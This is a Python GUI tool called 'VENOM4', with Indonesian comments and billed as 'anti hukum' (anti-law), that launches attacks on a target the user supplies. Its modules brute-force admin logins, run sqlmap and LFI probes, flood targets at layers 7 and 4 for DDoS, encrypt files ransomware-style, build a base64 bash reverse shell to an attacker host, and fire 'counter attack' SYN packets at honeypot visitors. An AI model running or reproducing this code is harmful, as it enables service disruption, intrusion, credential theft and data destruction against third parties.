#!/usr/bin/env python3
# [»Active!!«]
# VENOM4 - UNBREAKABLE ATTACK & DEFENSE SUITE
# PROFESIONAL, ANTI DRAMA, ANTI HUKUM

import os
import sys
import subprocess
import threading
import time
import socket
import random
import base64
import signal
from collections import defaultdict
from datetime import datetime
from urllib.parse import urlparse

try:
    import requests
    from cryptography.fernet import Fernet
    from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                                 QTabWidget, QGroupBox, QLabel, QLineEdit, QPushButton,
                                 QTextEdit, QTableWidget, QTableWidgetItem, QMessageBox, QSplitter)
    from PyQt5.QtCore import Qt, QThread, pyqtSignal
    from PyQt5.QtGui import QFont, QTextCursor
except ImportError as e:
    print(f"[!] Missing dependency: {e}. Jalankan installer dulu: sudo ./install_venom4.sh")
    sys.exit(1)

# Scapy optional
SCAPY_OK = False
try:
    from scapy.all import IP, TCP, send, sniff
    SCAPY_OK = True
except:
    pass

OUTPUT_DIR = "kalz_results"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# ========== THREAD WORKER ==========
class VenomWorker(QThread):
    log_signal = pyqtSignal(str, str)
    stats_signal = pyqtSignal(str, str)
    finished_signal = pyqtSignal()

    def __init__(self, mode, target="", lhost="", lport=""):
        super().__init__()
        self.mode = mode   # 'attack', 'defense', 'full'
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.running = True

    def log(self, msg, typ="+"):
        self.log_signal.emit(msg, typ)

    def update_stats(self, key, val):
        self.stats_signal.emit(key, val)

    def run_cmd(self, cmd, timeout=60):
        try:
            return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        except:
            return None

    def rand_ua(self):
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
        ]
        return random.choice(agents)

    # ---------- ATTACK MODULES ----------
    def osint_brutal(self, domain):
        self.log(f"OSINT terhadap {domain}", "*")
        whois = self.run_cmd(f"whois {domain}")
        if whois and whois.stdout:
            with open(f"{OUTPUT_DIR}/whois.txt", "w") as f:
                f.write(whois.stdout[:10000])
        self.run_cmd(f"dnsrecon -d {domain} -t std -c {OUTPUT_DIR}/dns.csv")
        if os.path.exists("/usr/share/wordlists/dirb/common.txt"):
            self.run_cmd(f"gobuster dns -d {domain} -w /usr/share/wordlists/dirb/common.txt -o {OUTPUT_DIR}/subdomains.txt")
        self.log("OSINT selesai", "+")

    def portscan_brutal(self, ip):
        self.log(f"Port scanning {ip}", "*")
        common = [21,22,23,25,80,443,445,8080,8443,3306,5432,3389,5900,6379,27017]
        open_ports = []
        for port in common:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((ip, port)) == 0:
                    open_ports.append(port)
                    self.log(f"port {port} terbuka", "!")
                s.close()
            except:
                pass
        if open_ports:
            self.run_cmd(f"nmap -sV -p{','.join(map(str,open_ports))} {ip} -oN {OUTPUT_DIR}/nmap.txt")
        self.update_stats("open_ports", str(len(open_ports)))
        return open_ports

    def web_brutal(self, url):
        self.log(f"Web attack ke {url}", "*")
        self.run_cmd(f"sqlmap -u '{url}' --batch --risk=3 --level=5 --threads=10 --random-agent --output-dir={OUTPUT_DIR}/sqlmap --dbs", timeout=300)
        self.run_cmd(f"nikto -h {url} -output {OUTPUT_DIR}/nikto.txt -Format txt", timeout=120)
        # LFI
        for p in ["../../../../etc/passwd", "..\\\\..\\\\..\\\\..\\\\windows\\win.ini"]:
            test = f"{url}?page={p}"
            try:
                r = requests.get(test, headers={"User-Agent":self.rand_ua()}, timeout=5)
                if "root:" in r.text or "[extensions]" in r.text:
                    self.log(f"LFI/RFI vuln: {test}", "!")
                    with open(f"{OUTPUT_DIR}/lfi.txt","a") as f:
                        f.write(test+"\n")
            except:
                pass
        # Brute admin panel sederhana
        for path in ["admin", "login", "wp-admin", "administrator", "cpanel", "phpmyadmin"]:
            full = f"{url}/{path}"
            try:
                if requests.get(full, timeout=3).status_code == 200:
                    self.log(f"Admin panel ditemukan: {full}", "!")
                    if os.path.exists("/usr/share/wordlists/fasttrack.txt"):
                        with open("/usr/share/wordlists/fasttrack.txt","r") as wl:
                            for pw in wl.readlines()[:50]:
                                pw = pw.strip()
                                data = {"user":"admin","pass":pw}
                                rp = requests.post(full, data=data, timeout=3, headers={"User-Agent":self.rand_ua()})
                                if "dashboard" in rp.text.lower() or "welcome" in rp.text.lower():
                                    self.log(f"Login success: admin:{pw}", "!")
                                    self.update_stats("success_login", "1")
                                    break
            except:
                pass

    def ddos_layer7(self, url, duration=60):
        self.log(f"Layer7 DDoS ke {url} ({duration}s)", "*")
        end = time.time() + duration
        def flood():
            while time.time() < end and self.running:
                try:
                    requests.get(url, headers={"User-Agent":self.rand_ua()}, timeout=2)
                except:
                    pass
        threads = []
        for _ in range(50):
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()
            threads.append(t)
        for t in threads:
            t.join(timeout=duration+1)
        self.log("Layer7 DDoS selesai", "+")

    def ddos_layer4(self, ip, port, duration=60):
        self.log(f"Layer4 SYN flood ke {ip}:{port}", "*")
        end = time.time() + duration
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError:
            self.log("Raw socket butuh root – skip layer4", "-")
            return
        except:
            self.log("Layer4 tidak support", "-")
            return
        while time.time() < end and self.running:
            try:
                sock.sendto(b"SYN"*1024, (ip, port))
            except:
                pass
        sock.close()
        self.log("Layer4 flood selesai", "+")

    def ransomware_encrypt(self, target_dir="/tmp"):
        self.log(f"Ransomware simulasi di {target_dir}", "!")
        key = Fernet.generate_key()
        cipher = Fernet(key)
        with open(f"{OUTPUT_DIR}/ransom_key.txt","w") as f:
            f.write(key.decode())
        count = 0
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                if file.endswith((".txt",".doc",".pdf",".jpg",".py",".conf")):
                    path = os.path.join(root, file)
                    try:
                        with open(path, "rb") as f:
                            data = f.read()
                        encrypted = cipher.encrypt(data)
                        with open(path, "wb") as f:
                            f.write(encrypted)
                        count += 1
                        if count % 10 == 0:
                            self.log(f"Encrypted {count} files...", "*")
                    except:
                        pass
        self.log(f"Ransomware selesai, {count} file dienkripsi. Kunci di {OUTPUT_DIR}/ransom_key.txt", "!")

    # ---------- DEFENSE MODULES ----------
    def defense_firewall(self):
        self.log("Menerapkan firewall hardening...", "*")
        self.run_cmd("iptables -F")
        self.run_cmd("iptables -X")
        self.run_cmd("iptables -P INPUT DROP")
        self.run_cmd("iptables -P FORWARD DROP")
        self.run_cmd("iptables -P OUTPUT ACCEPT")
        self.run_cmd("iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT")
        self.run_cmd("iptables -A INPUT -i lo -j ACCEPT")
        self.run_cmd("iptables -A INPUT -p tcp --dport 22 -m limit --limit 3/min -j ACCEPT")
        self.run_cmd("iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/second -j ACCEPT")
        self.run_cmd("iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP")
        self.run_cmd("iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP")
        self.log("Firewall aktif (policy DROP)", "+")

    def defense_kernel(self):
        self.log("Mengamankan kernel...", "*")
        conf = """
net.ipv4.tcp_syncookies = 1
net.ipv4.icmp_echo_ignore_all = 1
net.ipv4.conf.all.rp_filter = 1
net.ipv4.tcp_syn_retries = 2
"""
        with open("/etc/sysctl.d/99-venom4.conf", "w") as f:
            f.write(conf)
        self.run_cmd("sysctl -p /etc/sysctl.d/99-venom4.conf")
        self.log("Kernel protection aktif", "+")

    def honeypot(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('0.0.0.0', port))
            s.listen(5)
            while self.running:
                conn, addr = s.accept()
                ip = addr[0]
                self.log(f"Honeypot: {ip} mencoba port {port}", "!")
                conn.close()
                self.run_cmd(f"iptables -A INPUT -s {ip} -j DROP")
                self.update_stats("blocked_ips", "+1")
                if SCAPY_OK:
                    threading.Thread(target=self.counter_attack, args=(ip,), daemon=True).start()
        except:
            pass

    def counter_attack(self, ip):
        self.log(f"Counter attack ke {ip}", "#")
        if SCAPY_OK:
            for port in [22,80,443]:
                try:
                    send(IP(dst=ip)/TCP(dport=port, flags="S"), verbose=False)
                except:
                    pass
        self.log(f"Counter selesai terhadap {ip}", "#")

    def defense_run(self):
        self.log("Menjalankan defense system...", ">")
        if os.geteuid() != 0:
            self.log("Defense butuh root!", "-")
            return
        self.defense_firewall()
        self.defense_kernel()
        # Honeypot ports
        for port in [22, 8080, 3306]:
            threading.Thread(target=self.honeypot, args=(port,), daemon=True).start()
        self.log("Defense aktif (firewall + kernel + honeypot + auto block)", "+")
        while self.running:
            time.sleep(5)

    # ---------- MAIN RUN ----------
    def run(self):
        self.log(f"VENOM4 – mode: {self.mode}", ">")
        if self.mode in ["attack", "full"]:
            if not self.target:
                self.log("Target kosong!", "-")
                self.finished_signal.emit()
                return
            # parse target
            if self.target.startswith("http"):
                url = self.target
                domain = urlparse(url).netloc
            else:
                domain = self.target
                url = f"http://{domain}"
            try:
                ip = socket.gethostbyname(domain)
            except:
                self.log("Gagal resolve domain", "-")
                self.finished_signal.emit()
                return
            self.log(f"Target: {domain} ({ip})", "+")
            # attack threads
            t1 = threading.Thread(target=self.osint_brutal, args=(domain,))
            t2 = threading.Thread(target=self.portscan_brutal, args=(ip,))
            t3 = threading.Thread(target=self.web_brutal, args=(url,))
            t4 = threading.Thread(target=self.ddos_layer7, args=(url, 90))
            t5 = threading.Thread(target=self.ddos_layer4, args=(ip, 80, 90))
            t6 = threading.Thread(target=self.ransomware_encrypt, args=("/tmp",))
            for t in [t1,t2,t3,t4,t5,t6]:
                t.start()
            for t in [t1,t2,t3]:
                t.join()  # tunggu osint, scan, web selesai
            self.log("Attack selesai. Hasil di kalz_results/", "+")
            if self.lhost and self.lport:
                bash = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
                b64 = base64.b64encode(bash.encode()).decode()
                with open(f"{OUTPUT_DIR}/revshell.txt","w") as f:
                    f.write(b64)
                self.log("Reverse shell payload siap", "!")
                self.log(f"Jalankan listener: nc -lvnp {self.lport}", "*")
        if self.mode in ["defense", "full"]:
            self.defense_run()
        self.finished_signal.emit()

# ========== GUI ==========
class VenomGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("[»Active!!«] - VENOM4 | ATTACK & DEFENSE")
        self.setGeometry(100, 100, 1200, 700)
        # StyleSheet: Neon Blue, Neon Green, Neon Red
        self.setStyleSheet("""
            QMainWindow { background-color: #0a0a2a; }
            QTabWidget::pane { border: 2px solid #00ffff; background-color: #111122; }
            QTabBar::tab { background-color: #1a1a3a; color: #00ffff; padding: 10px; font-weight: bold; border-radius: 5px; }
            QTabBar::tab:selected { background-color: #330000; color: #ff5555; }
            QGroupBox { color: #00ffaa; border: 2px solid #00ffaa; border-radius: 5px; margin-top: 1ex; }
            QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 5px; }
            QLabel { color: #ccccff; }
            QLineEdit, QTextEdit { background-color: #1e1e3e; color: #00ffcc; border: 1px solid #ff44aa; border-radius: 3px; }
            QPushButton { background-color: #ff00aa; color: black; border: none; padding: 8px; font-weight: bold; border-radius: 5px; }
            QPushButton:hover { background-color: #ff5555; color: white; }
            QTableWidget { background-color: #111133; color: #00ff88; gridline-color: #ff00aa; }
            QProgressBar { border: 1px solid #ff00aa; background-color: #222; color: #00ffff; text-align: center; }
            QTextEdit { background-color: #000000; color: #00ffcc; font-family: monospace; border: 1px solid #00ffff; }
        """)
        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        title = QLabel("[»Active!!«] - VENOM4")
        title.setAlignment(Qt.AlignCenter)
        title.setFont(QFont("Courier", 20, QFont.Bold))
        title.setStyleSheet("color: #ff44aa; padding: 10px; background-color: #0a0a0a; border-radius: 10px;")
        layout.addWidget(title)
        tabs = QTabWidget()
        layout.addWidget(tabs)
        self.attack_tab = QWidget()
        tabs.addTab(self.attack_tab, "⚔️ ATTACK")
        self.setup_attack_tab()
        self.defense_tab = QWidget()
        tabs.addTab(self.defense_tab, "🛡️ DEFENSE")
        self.setup_defense_tab()
        self.full_tab = QWidget()
        tabs.addTab(self.full_tab, "💀 FULL MODE")
        self.setup_full_tab()
        self.log_tab = QWidget()
        tabs.addTab(self.log_tab, "📜 LOG & STATS")
        self.setup_log_tab()
        self.statusBar().showMessage("VENOM4 SIAP – JALANKAN PERINTAH")
        self.statusBar().setStyleSheet("color: #ff44aa; background-color: #0a0a2a;")
        self.worker = None

    def setup_attack_tab(self):
        layout = QVBoxLayout(self.attack_tab)
        g1 = QGroupBox("TARGET SASARAN")
        g1_layout = QHBoxLayout()
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("contoh: 192.168.1.100 atau https://example.com")
        g1_layout.addWidget(QLabel("Target:"))
        g1_layout.addWidget(self.target_input)
        g1.setLayout(g1_layout)
        layout.addWidget(g1)
        g2 = QGroupBox("REVERSE SHELL (OPSIONAL)")
        g2_layout = QHBoxLayout()
        self.lhost_input = QLineEdit()
        self.lhost_input.setPlaceholderText("10.0.0.5")
        self.lport_input = QLineEdit()
        self.lport_input.setPlaceholderText("4444")
        g2_layout.addWidget(QLabel("LHOST:"))
        g2_layout.addWidget(self.lhost_input)
        g2_layout.addWidget(QLabel("LPORT:"))
        g2_layout.addWidget(self.lport_input)
        g2.setLayout(g2_layout)
        layout.addWidget(g2)
        btn = QPushButton("🔥 EKSEKUSI SERANGAN 🔥")
        btn.clicked.connect(self.start_attack)
        layout.addWidget(btn)
        layout.addStretch()

    def setup_defense_tab(self):
        layout = QVBoxLayout(self.defense_tab)
        desc = QLabel("MODE PERTAHANAN: Firewall policy DROP, Kernel hardening, Honeypot (port 22,8080,3306), Auto block + Counter Attack (Scapy)")
        desc.setWordWrap(True)
        desc.setStyleSheet("color: #00ffaa;")
        layout.addWidget(desc)
        btn = QPushButton("🛡️ AKTIFKAN PERTAHANAN 🛡️")
        btn.clicked.connect(self.start_defense)
        layout.addWidget(btn)
        layout.addStretch()

    def setup_full_tab(self):
        layout = QVBoxLayout(self.full_tab)
        desc = QLabel("FULL MODE: Defense berjalan di background + Attack ke target. Sistem melindungi mesin sambil menghancurkan target.")
        desc.setWordWrap(True)
        desc.setStyleSheet("color: #ff8888;")
        layout.addWidget(desc)
        g = QGroupBox("TARGET FULL MODE")
        gl = QHBoxLayout()
        self.full_target = QLineEdit()
        self.full_target.setPlaceholderText("target ip atau domain")
        gl.addWidget(QLabel("Target:"))
        gl.addWidget(self.full_target)
        g.setLayout(gl)
        layout.addWidget(g)
        btn = QPushButton("💀 JALANKAN FULL MODE 💀")
        btn.clicked.connect(self.start_full)
        layout.addWidget(btn)
        layout.addStretch()

    def setup_log_tab(self):
        layout = QVBoxLayout(self.log_tab)
        splitter = QSplitter(Qt.Vertical)
        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        self.log_area.setFont(QFont("Monospace", 10))
        splitter.addWidget(self.log_area)
        self.stats_table = QTableWidget(0, 2)
        self.stats_table.setHorizontalHeaderLabels(["METRIK", "NILAI"])
        splitter.addWidget(self.stats_table)
        layout.addWidget(splitter)
        clear_btn = QPushButton("BERSIHKAN LOG")
        clear_btn.clicked.connect(lambda: self.log_area.clear())
        layout.addWidget(clear_btn)

    def log_message(self, msg, typ="+"):
        symbol = {"+":"[+]","!":"[!]","-":"[-]","*":"[*]","#":"[#]",">":[">"]}.get(typ,"[+]")
        ts = datetime.now().strftime("%H:%M:%S")
        color = {"!":"#ff5555","#":"#ffff55","+":"#55ff55","-":"#aaaaaa","*":"#55ffff"}.get(typ,"#00ffcc")
        self.log_area.append(f'<span style="color:{color};">[{ts}] {symbol} {msg}</span>')
        cursor = self.log_area.textCursor()
        cursor.movePosition(QTextCursor.End)
        self.log_area.setTextCursor(cursor)

    def update_stats(self, key, value):
        for row in range(self.stats_table.rowCount()):
            if self.stats_table.item(row, 0).text() == key:
                old = self.stats_table.item(row, 1).text()
                if value.startswith("+"):
                    new_val = str(int(old) + int(value[1:]))
                else:
                    new_val = value
                self.stats_table.setItem(row, 1, QTableWidgetItem(new_val))
                return
        row = self.stats_table.rowCount()
        self.stats_table.insertRow(row)
        self.stats_table.setItem(row, 0, QTableWidgetItem(key))
        self.stats_table.setItem(row, 1, QTableWidgetItem(value if not value.startswith("+") else value[1:]))

    def start_attack(self):
        target = self.target_input.text().strip()
        if not target:
            QMessageBox.warning(self, "ERROR", "Target tidak boleh kosong!")
            return
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip()
        self.btn_attack = self.sender()
        self.btn_attack.setEnabled(False)
        self.log_message(f"Memulai ATTACK ke {target}", ">")
        self.worker = VenomWorker("attack", target, lhost, lport)
        self.worker.log_signal.connect(self.log_message)
        self.worker.stats_signal.connect(self.update_stats)
        self.worker.finished_signal.connect(lambda: self.btn_attack.setEnabled(True))
        self.worker.start()

    def start_defense(self):
        self.btn_defense = self.sender()
        self.btn_defense.setEnabled(False)
        self.log_message("Memulai DEFENSE system...", ">")
        self.worker = VenomWorker("defense")
        self.worker.log_signal.connect(self.log_message)
        self.worker.stats_signal.connect(self.update_stats)
        self.worker.finished_signal.connect(lambda: self.btn_defense.setEnabled(True))
        self.worker.start()

    def start_full(self):
        target = self.full_target.text().strip()
        if not target:
            QMessageBox.warning(self, "ERROR", "Target kosong!")
            return
        self.btn_full = self.sender()
        self.btn_full.setEnabled(False)
        self.log_message(f"Memulai FULL MODE (Defense + Attack ke {target})", ">")
        self.worker = VenomWorker("full", target)
        self.worker.log_signal.connect(self.log_message)
        self.worker.stats_signal.connect(self.update_stats)
        self.worker.finished_signal.connect(lambda: self.btn_full.setEnabled(True))
        self.worker.start()

# ========== MAIN ==========
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] SEBAIKNYA JALANKAN SEBAGAI ROOT UNTUK FITUR MAX (raw socket, iptables)")
    signal.signal(signal.SIGINT, lambda x,y: sys.exit(0))
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    window = VenomGUI()
    window.show()
    sys.exit(app.exec_())
